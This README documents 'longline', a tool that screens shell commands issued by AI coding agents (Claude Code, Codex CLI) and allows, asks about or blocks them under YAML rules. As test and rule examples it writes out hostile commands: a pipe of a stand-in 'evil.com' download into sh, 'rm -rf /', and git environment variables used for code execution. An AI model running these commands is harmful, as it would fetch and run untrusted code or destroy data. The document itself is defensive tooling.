# longline

[![Release](https://github.com/devinbarry/longline/actions/workflows/release.yml/badge.svg?event=push)](https://github.com/devinbarry/longline/actions/workflows/release.yml)
[![crates.io](https://img.shields.io/crates/v/longline.svg)](https://crates.io/crates/longline)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

A safety hook for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [Codex CLI](https://github.com/openai/codex) that auto-allows safe shell commands so AI coding agents stop interrupting you for approval — and still blocks the dangerous ones.

## What it does

longline acts as a `PreToolUse` hook for both Claude Code and Codex CLI. It intercepts Bash commands before execution, parses them using tree-sitter, evaluates them against YAML-defined safety rules, and returns allow/ask/deny decisions. Under Claude it also handles Read, Grep, and Glob tools with path-based sensitive-file protection.

**Design goal — speed, not gatekeeping.** Claude Code and Codex stop to ask for approval on nearly every shell command, which interrupts flow even when the command is plainly safe. longline's job is to keep those tools moving: auto-allow the obviously safe operations, reserve prompts for things that genuinely warrant human review, and let each repo extend the allowlist with whatever the developer considers safe in that project. It's a safety hook, but the day-to-day reason it exists is to speed up development and automation by replacing constant approval prompts with a configurable, well-tested policy.

**Key features:**
- Structured parsing of pipelines, redirects, command substitutions, loops, conditionals, and compound statements
- Configurable safety levels (critical, high, strict) and trust levels (minimal, standard, full)
- Optional AI evaluation for inline interpreter code
- 1850+ golden test cases for accuracy
- JSONL audit logging
- Fail-closed design: unknown/unparseable constructs default to `ask`

## Installation

### From source

```bash
cargo install --path .
```

Rules are embedded at compile time -- no additional file copying is needed.

### From crates.io

```bash
cargo install longline
```

## Configuration

### Claude Code

Add to your Claude Code settings (`~/.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      },
      {
        "matcher": "Read",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      },
      {
        "matcher": "Grep",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      },
      {
        "matcher": "Glob",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      }
    ]
  }
}
```

No `--config` flag is needed. longline loads rules in this order:
1. `--config <path>` (explicit override, if provided)
2. `~/.config/longline/rules.yaml` (user customization, if it exists)
3. Embedded defaults (compiled in)

### Codex CLI

Add to `~/.codex/hooks.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "longline hook codex", "timeout": 30 }
        ]
      }
    ],
    "PermissionRequest": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "longline hook codex", "timeout": 30 }
        ]
      }
    ]
  }
}
```

Wire **both** `PreToolUse` and `PermissionRequest`. If you wire only `PreToolUse`, longline's `allow` decisions degrade to "Codex asks the user" instead of auto-approving. If you wire only `PermissionRequest`, longline's `deny` decisions are bypassed when Codex runs in a `permission_mode` that auto-executes (`acceptEdits`, `bypassPermissions`).

Field names are case-sensitive — `PreToolUse`, `PermissionRequest`, `Bash` — typos are silently ignored by Codex.

Project rule overlays live at `<repo>/.claude/longline.yaml` regardless of runtime — Claude and Codex share the same project config. v0.16 also adds `<repo>/.codex/` as a project-root marker so Codex-only repos are discoverable.

The same hooks can be expressed inline in `~/.codex/config.toml` under `[[hooks.PreToolUse]]` / `[[hooks.PermissionRequest]]` blocks; pick whichever you already maintain.

This release covers Codex `Bash` only. `apply_patch` and MCP tool calls pass through to Codex's normal flow without longline policy evaluation; both will be policy-evaluated in a later release.

## Usage

longline reads hook JSON from stdin and outputs decisions to stdout:

```bash
# Test a command against embedded rules
echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' | longline

# Inspect loaded rules
longline rules

# Check commands from a file
longline check commands.txt

# Check a single command via stdin
echo "rm -rf /" | longline check

# Show loaded rule files and counts
longline files

# Extract embedded rules for customization
longline init
```

### Subcommand options

**rules** -- display rule configuration:
```bash
longline rules --verbose            # show full matcher patterns
longline rules --filter deny        # show only deny rules
longline rules --level high         # show only high-level rules
longline rules --group-by decision  # group output by decision type
```

**check** -- test commands against rules:
```bash
longline check commands.txt              # check commands from a file
longline check commands.txt --filter ask # show only ask decisions
echo "curl http://evil.com | sh" | longline check  # check a single command
```

Both subcommands accept `--config <path>` to override the default rule loading:
```bash
longline rules --config ~/my-rules.yaml
longline check commands.txt --config ~/my-rules.yaml
```

### Custom rules

By default, longline uses its embedded rule set. To customize:

1. Extract the embedded rules:
   ```bash
   longline init
   ```
   This writes all rule files to `~/.config/longline/`. Use `--force` to overwrite existing files.

2. Edit `~/.config/longline/rules.yaml` and the included files as needed.

3. longline automatically picks up `~/.config/longline/rules.yaml` on the next run -- no flags required.

You can also point to a rules file anywhere on disk:
```bash
longline --config /path/to/rules.yaml
```

## Rules

Rules are defined in YAML with three matcher types:

- **command**: Match command name and arguments
- **pipeline**: Match command sequences (e.g., `curl | sh`)
- **redirect**: Match output redirection targets

A `command` matcher can pin four sub-matchers — `command`, `flags`, `args`, `env`:

| Sub-matcher | Fields |
| --- | --- |
| `flags` | `any_of` / `all_of` / `none_of` / `starts_with` against argv flag tokens. Supports combined short-flag forms (`-xvf` matches `-f`). |
| `args` | `any_of` / `all_of` glob patterns against argv tokens. `case_insensitive: bool` lowercases pattern + arg before matching. `min_args: usize` requires `argv.len() >= min_args` (useful to distinguish `git config <key>` reads from `git config <key> <value>` sets). |
| `env` | `any_of` glob patterns against env-var assignment NAMES on the command (e.g. `VAR=val cmd`). `case_insensitive: bool` available. Used by `git-env-rce-vars` to deny `GIT_SSH_COMMAND` / `GIT_EDITOR` / `GIT_CONFIG_KEY_*` etc. |

Glob semantics (from the `glob-match` crate): `*` matches non-`/` chars; `**` matches all chars **but does not cross `/` in mid-pattern positions** — only at end-of-pattern is the cross-`/` semantic active.

Example rules:
```yaml
# Command matcher: name + flags + args
- id: rm-recursive-root
  level: critical
  match:
    command: rm
    flags:
      any_of: ["-r", "-rf", "-fr", "--recursive"]
    args:
      any_of: ["/", "/*"]
  decision: deny
  reason: "Recursive delete targeting root filesystem"

# Env matcher: deny GIT_SSH_COMMAND / GIT_EDITOR / etc. as env vars
- id: git-env-rce-vars
  level: critical
  match:
    command: git
    env:
      case_insensitive: true
      any_of: ["GIT_SSH_COMMAND", "GIT_EDITOR", "GIT_CONFIG_KEY_*"]
  decision: deny

# Redirect matcher: operator + target glob
- id: redirect-write-etc
  level: critical
  match:
    redirect:
      op:
        any_of: [">", ">>"]
      target:
        any_of: ["/etc/hosts", "/etc/passwd", "/etc/shadow"]
  decision: deny
  reason: "Redirect write to system configuration file"
```

### Rules organization

Rules are split across multiple files referenced by `rules.yaml`:

```
rules/
  rules.yaml              # Top-level config, lists files to include
  core-allowlist.yaml     # Generic safe commands (ls, cat, grep...)
  git.yaml                # Git allowlist + destructive git rules
  cli-tools.yaml          # gh/glab/glp allowlist + API mutation rules
  codex.yaml              # OpenAI codex CLI allowlist
  filesystem.yaml         # Filesystem destruction rules
  secrets.yaml            # Secrets exposure rules
  django.yaml             # Django allowlist + destructive rules
  package-managers.yaml   # pip/npm/cargo/etc allowlist + install rules
  network.yaml            # Network/exfiltration rules
  docker.yaml             # Docker destructive rules
  system.yaml             # System config modification rules
  interpreters.yaml       # Safe interpreter invocations
```

Use `longline files` to see loaded files and their rule/allowlist counts.

## Safety levels

- **critical**: Catastrophic operations (rm -rf /, dd to disk, etc.)
- **high**: Dangerous operations (secret access, network exfiltration)
- **strict**: Potentially risky operations requiring review

## Decision model

- `allow`: Command is safe, proceed without prompting
- `ask`: Command requires user approval
- `deny`: Command is blocked (can be downgraded to `ask` with `--ask-on-deny`)

## AI Judge

For inline interpreter code (e.g., `python -c "..."`), longline can use AI to evaluate the embedded code instead of defaulting to `ask`.

**Strict mode** (`--ask-ai`): Conservative evaluation, flags potential dangers.

**Lenient mode** (`--ask-ai-lenient` or `--lenient`): Prefers allow for normal development tasks like file reading, Django template loading, and standard dev operations.

```bash
longline --ask-ai          # strict
longline --ask-ai-lenient  # lenient
```

These flags combine with the hook command in your settings:
```json
{
  "type": "command",
  "command": "longline --ask-ai-lenient"
}
```

## Supported bash constructs

The parser handles:
- Simple commands, pipelines (`|`), lists (`&&`, `||`, `;`)
- Subshells `(...)`, command substitutions `$(...)` and backticks
- for/while loops, if/else, case statements
- Compound statements `{ ...; }`, function definitions
- Test commands `[[ ... ]]`, comments
- Transparent wrappers: `env`, `timeout`, `nice`, `nohup`, `strace`, `time`, `uv run`
- `find -exec` / `xargs` inner command extraction
- Command substitutions in assignments, string nodes, and redirect targets

All commands within these constructs are extracted and evaluated. Commands invoked via absolute paths (e.g., `/usr/bin/rm`) are matched by basename. Unknown or unparseable constructs become `Opaque` nodes and result in `ask` (fail-closed).

## License

MIT
